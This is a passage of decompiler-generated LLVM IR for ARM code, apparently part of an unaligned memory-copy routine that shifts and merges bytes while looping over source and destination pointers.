dec_label_pc_15494:                               ; preds = %.thread128
  %v0_15494 = load i32, i32* @r1, align 4
  %v1_15494 = urem i32 %v0_15494, 4
  store i32 %v1_15494, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15494 = icmp eq i32 %v1_15494, 0
  store i1 %v2_15494, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_15494 to i2
  br i1 %v2_15494, label %dec_label_pc_153c8, label %dec_label_pc_1549c

dec_label_pc_1549c:                               ; preds = %dec_label_pc_153c0, %dec_label_pc_15494
  %v0_155bc76 = phi i32 [ %v1_153a0, %dec_label_pc_153c0 ], [ %v0_155bc77, %dec_label_pc_15494 ]
  %v0_15524 = phi i32 [ %v2_153b0, %dec_label_pc_153c0 ], [ %v2_1548c, %dec_label_pc_15494 ]
  %v0_154a4.off0 = phi i2 [ %extract.t, %dec_label_pc_153c0 ], [ %extract.t131, %dec_label_pc_15494 ]
  %v0_1549c = phi i32 [ %v0_153a0, %dec_label_pc_153c0 ], [ %v0_15494, %dec_label_pc_15494 ]
  %v1_1549c = and i32 %v0_1549c, -4
  store i32 %v1_1549c, i32* %r1.global-to-local, align 4
  %v1_154a0 = inttoptr i32 %v1_1549c to i32*
  %v2_154a0 = load i32, i32* %v1_154a0, align 4
  store i32 %v2_154a0, i32* %lr.global-to-local, align 4
  %v4_154a0 = add i32 %v1_1549c, 4
  store i32 %v4_154a0, i32* %r1.global-to-local, align 4
  %v1_1551c = add i32 %v0_15524, -12
  %v3_1551c = sub i32 11, %v0_15524
  %v4_1551c = and i32 %v3_1551c, %v0_15524
  %v5_1551c = icmp slt i32 %v4_1551c, 0
  store i1 %v5_1551c, i1* %cpsr_v.global-to-local, align 1
  %v6_1551c = icmp slt i32 %v1_1551c, 0
  store i1 %v6_1551c, i1* %cpsr_n.global-to-local, align 1
  %v7_1551c = icmp eq i32 %v0_15524, 12
  store i1 %v7_1551c, i1* %cpsr_z.global-to-local, align 1
  %v2_15520 = xor i1 %v6_1551c, %v5_1551c
  switch i2 %v0_154a4.off0, label %dec_label_pc_154b0 [
    i2 -1, label %dec_label_pc_15588
    i2 -2, label %dec_label_pc_1551c
  ]

dec_label_pc_154b0:                               ; preds = %dec_label_pc_1549c
  br i1 %v2_15520, label %dec_label_pc_154fc, label %dec_label_pc_154b8

dec_label_pc_154b8:                               ; preds = %dec_label_pc_154b0
  store i32 %v1_1551c, i32* %r2.global-to-local, align 4
  %v3_154bc = load i32, i32* @r4, align 4
  store i32 %v3_154bc, i32* %stack_var_-16, align 4
  %v6_154bc = load i32, i32* @r5, align 4
  store i32 %v6_154bc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_154c0

dec_label_pc_154c0:                               ; preds = %dec_label_pc_154c0.dec_label_pc_154c0_crit_edge, %dec_label_pc_154b8
  %v0_154e4 = phi i32 [ %v12_154e4, %dec_label_pc_154c0.dec_label_pc_154c0_crit_edge ], [ %v0_155bc76, %dec_label_pc_154b8 ]
  %v0_154c4 = phi i32 [ %v0_154c4.pre, %dec_label_pc_154c0.dec_label_pc_154c0_crit_edge ], [ %v4_154a0, %dec_label_pc_154b8 ]
  %v0_154c0 = phi i32 [ %v0_154c0.pre, %dec_label_pc_154c0.dec_label_pc_154c0_crit_edge ], [ %v2_154a0, %dec_label_pc_154b8 ]
  %v3_154c0 = udiv i32 %v0_154c0, 256
  %v1_154c4 = inttoptr i32 %v0_154c4 to i32*
  %v2_154c4 = load i32, i32* %v1_154c4, align 4
  store i32 %v2_154c4, i32* %r4.global-to-local, align 4
  %v3_154c4 = add i32 %v0_154c4, 4
  %v4_154c4 = inttoptr i32 %v3_154c4 to i32*
  %v5_154c4 = load i32, i32* %v4_154c4, align 4
  store i32 %v5_154c4, i32* %r5.global-to-local, align 4
  %v6_154c4 = add i32 %v0_154c4, 8
  %v7_154c4 = inttoptr i32 %v6_154c4 to i32*
  %v8_154c4 = load i32, i32* %v7_154c4, align 4
  store i32 %v8_154c4, i32* %ip.global-to-local, align 4
  %v9_154c4 = add i32 %v0_154c4, 12
  %v10_154c4 = inttoptr i32 %v9_154c4 to i32*
  %v11_154c4 = load i32, i32* %v10_154c4, align 4
  store i32 %v11_154c4, i32* %lr.global-to-local, align 4
  %v12_154c4 = add i32 %v0_154c4, 16
  store i32 %v12_154c4, i32* %r1.global-to-local, align 4
  %v4_154c8 = mul i32 %v2_154c4, 16777216
  %v5_154c8 = or i32 %v4_154c8, %v3_154c0
  store i32 %v5_154c8, i32* @r3, align 4
  %v3_154cc = udiv i32 %v2_154c4, 256
  %v4_154d0 = mul i32 %v5_154c4, 16777216
  %v5_154d0 = or i32 %v4_154d0, %v3_154cc
  store i32 %v5_154d0, i32* %r4.global-to-local, align 4
  %v3_154d4 = udiv i32 %v5_154c4, 256
  %v4_154d8 = mul i32 %v8_154c4, 16777216
  %v5_154d8 = or i32 %v4_154d8, %v3_154d4
  store i32 %v5_154d8, i32* %r5.global-to-local, align 4
  %v3_154dc = udiv i32 %v8_154c4, 256
  %v4_154e0 = mul i32 %v11_154c4, 16777216
  %v5_154e0 = or i32 %v4_154e0, %v3_154dc
  store i32 %v5_154e0, i32* @ip, align 4
  %v1_154e4 = inttoptr i32 %v0_154e4 to i32*
  store i32 %v5_154c8, i32* %v1_154e4, align 4
  %v3_154e4 = add i32 %v0_154e4, 4
  %v4_154e4 = inttoptr i32 %v3_154e4 to i32*
  %v5_154e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_154e4, i32* %v4_154e4, align 4
  %v6_154e4 = add i32 %v0_154e4, 8
  %v7_154e4 = inttoptr i32 %v6_154e4 to i32*
  %v8_154e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_154e4, i32* %v7_154e4, align 4
  %v9_154e4 = add i32 %v0_154e4, 12
  %v10_154e4 = inttoptr i32 %v9_154e4 to i32*
  %v11_154e4 = load i32, i32* @ip, align 4
  store i32 %v11_154e4, i32* %v10_154e4, align 4
  %v12_154e4 = add i32 %v0_154e4, 16
  store i32 %v12_154e4, i32* @r0, align 4
  %v0_154e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_154e8 = add i32 %v0_154e8, -16
  store i32 %v1_154e8, i32* %r2.global-to-local, align 4
  %v3_154e8 = sub i32 15, %v0_154e8
  %v4_154e8 = and i32 %v3_154e8, %v0_154e8
  %v5_154e8 = icmp slt i32 %v4_154e8, 0
  %v6_154e8 = icmp slt i32 %v1_154e8, 0
  %v2_154ec = xor i1 %v6_154e8, %v5_154e8
  br i1 %v2_154ec, label %dec_label_pc_154f0, label %dec_label_pc_154c0.dec_label_pc_154c0_crit_edge

dec_label_pc_154c0.dec_label_pc_154c0_crit_edge:  ; preds = %dec_label_pc_154c0
  %v0_154c0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_154c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154c0

dec_label_pc_154f0:                               ; preds = %dec_label_pc_154c0
  %v2_154f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_154f0, i32* @r4, align 4
  %v5_154f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_154f0, i32* @r5, align 4
  %v1_154f4 = add i32 %v0_154e8, -4
  store i32 %v1_154f4, i32* %r2.global-to-local, align 4
  %v3_154f4 = add i32 %v0_154e8, 2147483632
  %v4_154f4 = and i32 %v1_154f4, %v3_154f4
  %v5_154f4 = icmp slt i32 %v4_154f4, 0
  store i1 %v5_154f4, i1* %cpsr_v.global-to-local, align 1
  %v6_154f4 = icmp slt i32 %v1_154f4, 0
  store i1 %v6_154f4, i1* %cpsr_n.global-to-local, align 1
  %v7_154f4 = icmp eq i32 %v1_154f4, 0
  store i1 %v7_154f4, i1* %cpsr_z.global-to-local, align 1
  %v2_154f8 = xor i1 %v6_154f4, %v5_154f4
  br i1 %v2_154f8, label %dec_label_pc_15514, label %dec_label_pc_154fc

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154f0, %dec_label_pc_154b0, %dec_label_pc_154fc
  %v1_15508 = phi i32 [ %v4_15508, %dec_label_pc_154fc ], [ %v12_154e4, %dec_label_pc_154f0 ], [ %v0_155bc76, %dec_label_pc_154b0 ]
  %v0_154fc = load i32, i32* %lr.global-to-local, align 4
  %v3_154fc = udiv i32 %v0_154fc, 256
  store i32 %v3_154fc, i32* %ip.global-to-local, align 4
  %v0_15500 = load i32, i32* %r1.global-to-local, align 4
  %v1_15500 = inttoptr i32 %v0_15500 to i32*
  %v2_15500 = load i32, i32* %v1_15500, align 4
  store i32 %v2_15500, i32* %lr.global-to-local, align 4
  %v4_15500 = add i32 %v0_15500, 4
  store i32 %v4_15500, i32* %r1.global-to-local, align 4
  %v4_15504 = mul i32 %v2_15500, 16777216
  %v5_15504 = or i32 %v4_15504, %v3_154fc
  store i32 %v5_15504, i32* @ip, align 4
  %v2_15508 = inttoptr i32 %v1_15508 to i32*
  store i32 %v5_15504, i32* %v2_15508, align 4
  %v3_15508 = load i32, i32* @r0, align 4
  %v4_15508 = add i32 %v3_15508, 4
  store i32 %v4_15508, i32* @r0, align 4
  %v0_1550c = load i32, i32* %r2.global-to-local, align 4
  %v1_1550c = add i32 %v0_1550c, -4
  store i32 %v1_1550c, i32* %r2.global-to-local, align 4
  %v3_1550c = sub i32 3, %v0_1550c
  %v4_1550c = and i32 %v3_1550c, %v0_1550c
  %v5_1550c = icmp slt i32 %v4_1550c, 0
  %v6_1550c = icmp slt i32 %v1_1550c, 0
  %v2_15510 = xor i1 %v6_1550c, %v5_1550c
  br i1 %v2_15510, label %dec_label_pc_15514.loopexit, label %dec_label_pc_154fc

dec_label_pc_15514.loopexit:                      ; preds = %dec_label_pc_154fc
  %v7_1550c = icmp eq i32 %v0_1550c, 4
  store i1 %v5_1550c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1550c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1550c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15514

dec_label_pc_15514:                               ; preds = %dec_label_pc_15514.loopexit, %dec_label_pc_154f0
  %v0_1543c59 = phi i32 [ %v1_1550c, %dec_label_pc_15514.loopexit ], [ %v1_154f4, %dec_label_pc_154f0 ]
  %v0_15514 = load i32, i32* %r1.global-to-local, align 4
  %v1_15514 = add i32 %v0_15514, -3
  store i32 %v1_15514, i32* @r1, align 4
  br label %bb140

dec_label_pc_1551c:                               ; preds = %dec_label_pc_1549c
  br i1 %v2_15520, label %dec_label_pc_15568, label %dec_label_pc_15524

dec_label_pc_15524:                               ; preds = %dec_label_pc_1551c
  store i32 %v1_1551c, i32* %r2.global-to-local, align 4
  %v3_15528 = load i32, i32* @r4, align 4
  store i32 %v3_15528, i32* %stack_var_-16, align 4
  %v6_15528 = load i32, i32* @r5, align 4
  store i32 %v6_15528, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_1552c.dec_label_pc_1552c_crit_edge, %dec_label_pc_15524
  %v0_15550 = phi i32 [ %v12_15550, %dec_label_pc_1552c.dec_label_pc_1552c_crit_edge ], [ %v0_155bc76, %dec_label_pc_15524 ]
  %v0_15530 = phi i32 [ %v0_15530.pre, %dec_label_pc_1552c.dec_label_pc_1552c_crit_edge ], [ %v4_154a0, %dec_label_pc_15524 ]
  %v0_1552c = phi i32 [ %v0_1552c.pre, %dec_label_pc_1552c.dec_label_pc_1552c_crit_edge ], [ %v2_154a0, %dec_label_pc_15524 ]
  %v3_1552c = udiv i32 %v0_1552c, 65536
  %v1_15530 = inttoptr i32 %v0_15530 to i32*
  %v2_15530 = load i32, i32* %v1_15530, align 4
  store i32 %v2_15530, i32* %r4.global-to-local, align 4
  %v3_15530 = add i32 %v0_15530, 4
  %v4_15530 = inttoptr i32 %v3_15530 to i32*
  %v5_15530 = load i32, i32* %v4_15530, align 4
  store i32 %v5_15530, i32* %r5.global-to-local, align 4
  %v6_15530 = add i32 %v0_15530, 8
  %v7_15530 = inttoptr i32 %v6_15530 to i32*
  %v8_15530 = load i32, i32* %v7_15530, align 4
  store i32 %v8_15530, i32* %ip.global-to-local, align 4
  %v9_15530 = add i32 %v0_15530, 12
  %v10_15530 = inttoptr i32 %v9_15530 to i32*
  %v11_15530 = load i32, i32* %v10_15530, align 4
  store i32 %v11_15530, i32* %lr.global-to-local, align 4
  %v12_15530 = add i32 %v0_15530, 16
  store i32 %v12_15530, i32* %r1.global-to-local, align 4
  %v4_15534 = mul i32 %v2_15530, 65536
  %v5_15534 = or i32 %v4_15534, %v3_1552c
  store i32 %v5_15534, i32* @r3, align 4
  %v3_15538 = udiv i32 %v2_15530, 65536
  %v4_1553c = mul i32 %v5_15530, 65536
  %v5_1553c = or i32 %v4_1553c, %v3_15538
  store i32 %v5_1553c, i32* %r4.global-to-local, align 4
  %v3_15540 = udiv i32 %v5_15530, 65536
  %v4_15544 = mul i32 %v8_15530, 65536
  %v5_15544 = or i32 %v4_15544, %v3_15540
  store i32 %v5_15544, i32* %r5.global-to-local, align 4
  %v3_15548 = udiv i32 %v8_15530, 65536
  %v4_1554c = mul i32 %v11_15530, 65536
  %v5_1554c = or i32 %v4_1554c, %v3_15548
  store i32 %v5_1554c, i32* @ip, align 4
  %v1_15550 = inttoptr i32 %v0_15550 to i32*
  store i32 %v5_15534, i32* %v1_15550, align 4
  %v3_15550 = add i32 %v0_15550, 4
  %v4_15550 = inttoptr i32 %v3_15550 to i32*
  %v5_15550 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15550, i32* %v4_15550, align 4
  %v6_15550 = add i32 %v0_15550, 8
  %v7_15550 = inttoptr i32 %v6_15550 to i32*
  %v8_15550 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15550, i32* %v7_15550, align 4
  %v9_15550 = add i32 %v0_15550, 12
  %v10_15550 = inttoptr i32 %v9_15550 to i32*
  %v11_15550 = load i32, i32* @ip, align 4
  store i32 %v11_15550, i32* %v10_15550, align 4
  %v12_15550 = add i32 %v0_15550, 16
  store i32 %v12_15550, i32* @r0, align 4
  %v0_15554 = load i32, i32* %r2.global-to-local, align 4
  %v1_15554 = add i32 %v0_15554, -16
  store i32 %v1_15554, i32* %r2.global-to-local, align 4
  %v3_15554 = sub i32 15, %v0_15554
  %v4_15554 = and i32 %v3_15554, %v0_15554
  %v5_15554 = icmp slt i32 %v4_15554, 0
  %v6_15554 = icmp slt i32 %v1_15554, 0
  %v2_15558 = xor i1 %v6_15554, %v5_15554
  br i1 %v2_15558, label %dec_label_pc_1555c, label %dec_label_pc_1552c.dec_label_pc_1552c_crit_edge

dec_label_pc_1552c.dec_label_pc_1552c_crit_edge:  ; preds = %dec_label_pc_1552c
  %v0_1552c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15530.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1552c

dec_label_pc_1555c:                               ; preds = %dec_label_pc_1552c
  %v2_1555c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1555c, i32* @r4, align 4
  %v5_1555c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1555c, i32* @r5, align 4
  %v1_15560 = add i32 %v0_15554, -4
  store i32 %v1_15560, i32* %r2.global-to-local, align 4
  %v3_15560 = add i32 %v0_15554, 2147483632
  %v4_15560 = and i32 %v1_15560, %v3_15560
  %v5_15560 = icmp slt i32 %v4_15560, 0
  store i1 %v5_15560, i1* %cpsr_v.global-to-local, align 1
  %v6_15560 = icmp slt i32 %v1_15560, 0
  store i1 %v6_15560, i1* %cpsr_n.global-to-local, align 1
  %v7_15560 = icmp eq i32 %v1_15560, 0
  store i1 %v7_15560, i1* %cpsr_z.global-to-local, align 1
  %v2_15564 = xor i1 %v6_15560, %v5_15560
  br i1 %v2_15564, label %dec_label_pc_15580, label %dec_label_pc_15568

dec_label_pc_15568:                               ; preds = %dec_label_pc_1555c, %dec_label_pc_1551c, %dec_label_pc_15568
  %v1_15574 = phi i32 [ %v4_15574, %dec_label_pc_15568 ], [ %v12_15550, %dec_label_pc_1555c ], [ %v0_155bc76, %dec_label_pc_1551c ]
  %v0_15568 = load i32, i32* %lr.global-to-local, align 4
  %v3_15568 = udiv i32 %v0_15568, 65536
  store i32 %v3_15568, i32* %ip.global-to-local, align 4
  %v0_1556c = load i32, i32* %r1.global-to-local, align 4
  %v1_1556c = inttoptr i32 %v0_1556c to i32*
  %v2_1556c = load i32, i32* %v1_1556c, align 4
  store i32 %v2_1556c, i32* %lr.global-to-local, align 4
  %v4_1556c = add i32 %v0_1556c, 4
  store i32 %v4_1556c, i32* %r1.global-to-local, align 4
  %v4_15570 = mul i32 %v2_1556c, 65536
  %v5_15570 = or i32 %v4_15570, %v3_15568
  store i32 %v5_15570, i32* @ip, align 4
  %v2_15574 = inttoptr i32 %v1_15574 to i32*
  store i32 %v5_15570, i32* %v2_15574, align 4
  %v3_15574 = load i32, i32* @r0, align 4
  %v4_15574 = add i32 %v3_15574, 4
  store i32 %v4_15574, i32* @r0, align 4
  %v0_15578 = load i32, i32* %r2.global-to-local, align 4
  %v1_15578 = add i32 %v0_15578, -4
  store i32 %v1_15578, i32* %r2.global-to-local, align 4
  %v3_15578 = sub i32 3, %v0_15578
  %v4_15578 = and i32 %v3_15578, %v0_15578
  %v5_15578 = icmp slt i32 %v4_15578, 0
  %v6_15578 = icmp slt i32 %v1_15578, 0
  %v2_1557c = xor i1 %v6_15578, %v5_15578
  br i1 %v2_1557c, label %dec_label_pc_15580.loopexit, label %dec_label_pc_15568

dec_label_pc_15580.loopexit:                      ; preds = %dec_label_pc_15568
  %v7_15578 = icmp eq i32 %v0_15578, 4
  store i1 %v5_15578, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15578, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15578, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15580

dec_label_pc_15580:                               ; preds = %dec_label_pc_15580.loopexit, %dec_label_pc_1555c
  %v0_1543c60 = phi i32 [ %v1_15578, %dec_label_pc_15580.loopexit ], [ %v1_15560, %dec_label_pc_1555c ]
  %v0_15580 = load i32, i32* %r1.global-to-local, align 4
  %v1_15580 = add i32 %v0_15580, -2
  store i32 %v1_15580, i32* @r1, align 4
  br label %bb140

dec_label_pc_15588:                               ; preds = %dec_label_pc_1549c
  br i1 %v2_15520, label %dec_label_pc_155d4, label %dec_label_pc_15590

dec_label_pc_15590:                               ; preds = %dec_label_pc_15588
  store i32 %v1_1551c, i32* %r2.global-to-local, align 4
  %v3_15594 = load i32, i32* @r4, align 4
  store i32 %v3_15594, i32* %stack_var_-16, align 4
  %v6_15594 = load i32, i32* @r5, align 4
  store i32 %v6_15594, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15598

dec_label_pc_15598:                               ; preds = %dec_label_pc_15598.dec_label_pc_15598_crit_edge, %dec_label_pc_15590
  %v0_155bc = phi i32 [ %v12_155bc, %dec_label_pc_15598.dec_label_pc_15598_crit_edge ], [ %v0_155bc76, %dec_label_pc_15590 ]
  %v0_1559c = phi i32 [ %v0_1559c.pre, %dec_label_pc_15598.dec_label_pc_15598_crit_edge ], [ %v4_154a0, %dec_label_pc_15590 ]
  %v0_15598 = phi i32 [ %v0_15598.pre, %dec_label_pc_15598.dec_label_pc_15598_crit_edge ], [ %v2_154a0, %dec_label_pc_15590 ]
  %v3_15598 = udiv i32 %v0_15598, 16777216
  %v1_1559c = inttoptr i32 %v0_1559c to i32*
  %v2_1559c = load i32, i32* %v1_1559c, align 4
  store i32 %v2_1559c, i32* %r4.global-to-local, align 4
  %v3_1559c = add i32 %v0_1559c, 4
  %v4_1559c = inttoptr i32 %v3_1559c to i32*
  %v5_1559c = load i32, i32* %v4_1559c, align 4
  store i32 %v5_1559c, i32* %r5.global-to-local, align 4
  %v6_1559c = add i32 %v0_1559c, 8
  %v7_1559c = inttoptr i32 %v6_1559c to i32*
  %v8_1559c = load i32, i32* %v7_1559c, align 4
  store i32 %v8_1559c, i32* %ip.global-to-local, align 4
  %v9_1559c = add i32 %v0_1559c, 12
  %v10_1559c = inttoptr i32 %v9_1559c to i32*
  %v11_1559c = load i32, i32* %v10_1559c, align 4
  store i32 %v11_1559c, i32* %lr.global-to-local, align 4
  %v12_1559c = add i32 %v0_1559c, 16
  store i32 %v12_1559c, i32* %r1.global-to-local, align 4
  %v4_155a0 = mul i32 %v2_1559c, 256
  %v5_155a0 = or i32 %v4_155a0, %v3_15598
  store i32 %v5_155a0, i32* @r3, align 4
  %v3_155a4 = udiv i32 %v2_1559c, 16777216
  %v4_155a8 = mul i32 %v5_1559c, 256
  %v5_155a8 = or i32 %v4_155a8, %v3_155a4
  store i32 %v5_155a8, i32* %r4.global-to-local, align 4
  %v3_155ac = udiv i32 %v5_1559c, 16777216
  %v4_155b0 = mul i32 %v8_1559c, 256
  %v5_155b0 = or i32 %v4_155b0, %v3_155ac
  store i32 %v5_155b0, i32* %r5.global-to-local, align 4
  %v3_155b4 = udiv i32 %v8_1559c, 16777216
  %v4_155b8 = mul i32 %v11_1559c, 256
  %v5_155b8 = or i32 %v4_155b8, %v3_155b4
  store i32 %v5_155b8, i32* @ip, align 4
  %v1_155bc = inttoptr i32 %v0_155bc to i32*
  store i32 %v5_155a0, i32* %v1_155bc, align 4
  %v3_155bc = add i32 %v0_155bc, 4
  %v4_155bc = inttoptr i32 %v3_155bc to i32*
  %v5_155bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_155bc, i32* %v4_155bc, align 4
  %v6_155bc = add i32 %v0_155bc, 8
  %v7_155bc = inttoptr i32 %v6_155bc to i32*
  %v8_155bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_155bc, i32* %v7_155bc, align 4
  %v9_155bc = add i32 %v0_155bc, 12
  %v10_155bc = inttoptr i32 %v9_155bc to i32*
  %v11_155bc = load i32, i32* @ip, align 4
  store i32 %v11_155bc, i32* %v10_155bc, align 4
  %v12_155bc = add i32 %v0_155bc, 16
  store i32 %v12_155bc, i32* @r0, align 4
  %v0_155c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_155c0 = add i32 %v0_155c0, -16
  store i32 %v1_155c0, i32* %r2.global-to-local, align 4
  %v3_155c0 = sub i32 15, %v0_155c0
  %v4_155c0 = and i32 %v3_155c0, %v0_155c0
  %v5_155c0 = icmp slt i32 %v4_155c0, 0
  %v6_155c0 = icmp slt i32 %v1_155c0, 0
  %v2_155c4 = xor i1 %v6_155c0, %v5_155c0
  br i1 %v2_155c4, label %dec_label_pc_155c8, label %dec_label_pc_15598.dec_label_pc_15598_crit_edge

dec_label_pc_15598.dec_label_pc_15598_crit_edge:  ; preds = %dec_label_pc_15598
  %v0_15598.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1559c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15598

dec_label_pc_155c8:                               ; preds = %dec_label_pc_15598
  %v2_155c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_155c8, i32* @r4, align 4
  %v5_155c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_155c8, i32* @r5, align 4
  %v1_155cc = add i32 %v0_155c0, -4
  store i32 %v1_155cc, i32* %r2.global-to-local, align 4
  %v3_155cc = add i32 %v0_155c0, 2147483632
  %v4_155cc = and i32 %v1_155cc, %v3_155cc
  %v5_155cc = icmp slt i32 %v4_155cc, 0
  store i1 %v5_155cc, i1* %cpsr_v.global-to-local, align 1
  %v6_155cc = icmp slt i32 %v1_155cc, 0
  store i1 %v6_155cc, i1* %cpsr_n.global-to-local, align 1
  %v7_155cc = icmp eq i32 %v1_155cc, 0
  store i1 %v7_155cc, i1* %cpsr_z.global-to-local, align 1
  %v2_155d0 = xor i1 %v6_155cc, %v5_155cc
  br i1 %v2_155d0, label %dec_label_pc_155ec, label %dec_label_pc_155d4

dec_label_pc_155d4:                               ; preds = %dec_label_pc_155c8, %dec_label_pc_15588, %dec_label_pc_155d4
  %v1_155e0 = phi i32 [ %v4_155e0, %dec_label_pc_155d4 ], [ %v12_155bc, %dec_label_pc_155c8 ], [ %v0_155bc76, %dec_label_pc_15588 ]
  %v0_155d4 = load i32, i32* %lr.global-to-local, align 4
  %v3_155d4 = udiv i32 %v0_155d4, 16777216
  store i32 %v3_155d4, i32* %ip.global-to-local, align 4
  %v0_155d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_155d8 = inttoptr i32 %v0_155d8 to i32*
  %v2_155d8 = load i32, i32* %v1_155d8, align 4
  store i32 %v2_155d8, i32* %lr.global-to-local, align 4
  %v4_155d8 = add i32 %v0_155d8, 4
  store i32 %v4_155d8, i32* %r1.global-to-local, align 4
  %v4_155dc = mul i32 %v2_155d8, 256
  %v5_155dc = or i32 %v4_155dc, %v3_155d4
  store i32 %v5_155dc, i32* @ip, align 4
  %v2_155e0 = inttoptr i32 %v1_155e0 to i32*
  store i32 %v5_155dc, i32* %v2_155e0, align 4
  %v3_155e0 = load i32, i32* @r0, align 4
  %v4_155e0 = add i32 %v3_155e0, 4
  store i32 %v4_155e0, i32* @r0, align 4
  %v0_155e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_155e4 = add i32 %v0_155e4, -4
  store i32 %v1_155e4, i32* %r2.global-to-local, align 4
  %v3_155e4 = sub i32 3, %v0_155e4
  %v4_155e4 = and i32 %v3_155e4, %v0_155e4
  %v5_155e4 = icmp slt i32 %v4_155e4, 0
  %v6_155e4 = icmp slt i32 %v1_155e4, 0
  %v2_155e8 = xor i1 %v6_155e4, %v5_155e4
  br i1 %v2_155e8, label %dec_label_pc_155ec.loopexit, label %dec_label_pc_155d4

dec_label_pc_155ec.loopexit:                      ; preds = %dec_label_pc_155d4
  %v7_155e4 = icmp eq i32 %v0_155e4, 4
  store i1 %v5_155e4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_155e4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_155e4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_155ec

dec_label_pc_155ec:                               ; preds = %dec_label_pc_155ec.loopexit, %dec_label_pc_155c8
  %v0_1543c61 = phi i32 [ %v1_155e4, %dec_label_pc_155ec.loopexit ], [ %v1_155cc, %dec_label_pc_155c8 ]
  %v0_155ec = load i32, i32* %r1.global-to-local, align 4
  %v1_155ec = add i32 %v0_155ec, -1
  store i32 %v1_155ec, i32* @r1, align 4
  br label %bb140

dec_label_pc_155f4:                               ; preds = %dec_label_pc_153a0
  %v1_155f4 = load i32, i32* @r2, align 4
  %v2_155f4 = add i32 %v1_155f4, %v0_153a0
  store i32 %v2_155f4, i32* %r1.global-to-local, align 4
  %v2_155f8 = add i32 %v1_155f4, %v1_153a0
  store i32 %v2_155f8, i32* %r0.global-to-local, align 4
  %v2_155fc = add i32 %v1_155f4, -4
  store i32 %v2_155fc, i32* %r2.global-to-local, align 4
  %v4_155fc = sub i32 3, %v1_155f4
  %v5_155fc = and i32 %v4_155fc, %v1_155f4
  %v6_155fc = icmp slt i32 %v5_155fc, 0
  store i1 %v6_155fc, i1* %cpsr_v.global-to-local, align 1
  %v7_155fc = icmp slt i32 %v2_155fc, 0
  store i1 %v7_155fc, i1* %cpsr_n.global-to-local, align 1
  %v8_155fc = icmp eq i32 %v1_155f4, 4
  store i1 %v8_155fc, i1* %cpsr_z.global-to-local, align 1
  %v5_15600 = icmp slt i32 %v1_155f4, 4
  br i1 %v5_15600, label %bb150, label %dec_label_pc_15604

dec_label_pc_15604:                               ; preds = %dec_label_pc_155f4
  %v1_15604 = urem i32 %v2_155f8, 4
  store i32 %v1_15604, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15604 = icmp eq i32 %v1_15604, 0
  store i1 %v2_15604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15604, label %dec_label_pc_1560c, label %dec_label_pc_156ac

dec_label_pc_1560c:                               ; preds = %dec_label_pc_15604
  %v1_1560c = urem i32 %v2_155f4, 4
  store i32 %v1_1560c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1560c = icmp eq i32 %v1_1560c, 0
  store i1 %v2_1560c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1560c, label %dec_label_pc_15614, label %dec_label_pc_156d8

dec_label_pc_15614:                               ; preds = %dec_label_pc_1560c, %dec_label_pc_156d0
  %v0_1562c37 = phi i32 [ %v2_155f8, %dec_label_pc_1560c ], [ %v0_1572020, %dec_label_pc_156d0 ]
  %v0_1562836 = phi i32 [ %v2_155f4, %dec_label_pc_1560c ], [ %v0_156d0, %dec_label_pc_156d0 ]
  %v0_15614 = phi i32 [ %v2_155fc, %dec_label_pc_1560c ], [ %v2_156c8, %dec_label_pc_156d0 ]
  %v2_15614 = add i32 %v0_15614, -8
  store i32 %v2_15614, i32* %r2.global-to-local, align 4
  %v4_15614 = sub i32 7, %v0_15614
  %v5_15614 = and i32 %v4_15614, %v0_15614
  %v6_15614 = icmp slt i32 %v5_15614, 0
  store i1 %v6_15614, i1* %cpsr_v.global-to-local, align 1
  %v7_15614 = icmp slt i32 %v2_15614, 0
  store i1 %v7_15614, i1* %cpsr_n.global-to-local, align 1
  %v8_15614 = icmp eq i32 %v0_15614, 8
  store i1 %v8_15614, i1* %cpsr_z.global-to-local, align 1
  %v5_15618 = icmp slt i32 %v0_15614, 8
  br i1 %v5_15618, label %dec_label_pc_15664, label %dec_label_pc_1561c

dec_label_pc_1561c:                               ; preds = %dec_label_pc_15614
  %v3_1561c = load i32, i32* @r4, align 4
  %v5_1561c = inttoptr i32 %v3_1561c to i8*
